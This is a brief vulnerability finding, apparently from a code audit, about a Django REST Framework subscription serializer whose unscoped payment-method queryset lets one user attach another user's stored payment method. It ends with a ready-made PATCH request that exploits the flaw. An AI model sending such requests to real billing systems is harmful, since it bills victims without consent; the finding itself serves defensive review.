diagnosis: CustomerSubscriptionSerializer declares payment_method using a HyperlinkedRelatedField with a global unscoped queryset: StoredPaymentMethod.objects.all(). When updating a subscription, DRF deserializes the hyperlinked URL against this global queryset without validating that the referenced payment method belongs to request.user. An attacker can link another user's stored payment method URL to their own subscription, effectively billing victim accounts.
exploit_request:
PATCH /api/subscriptions/84/ HTTP/1.1
Host: billing.saas.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"payment_method": "https://billing.saas.com/api/payment-methods/304/"}
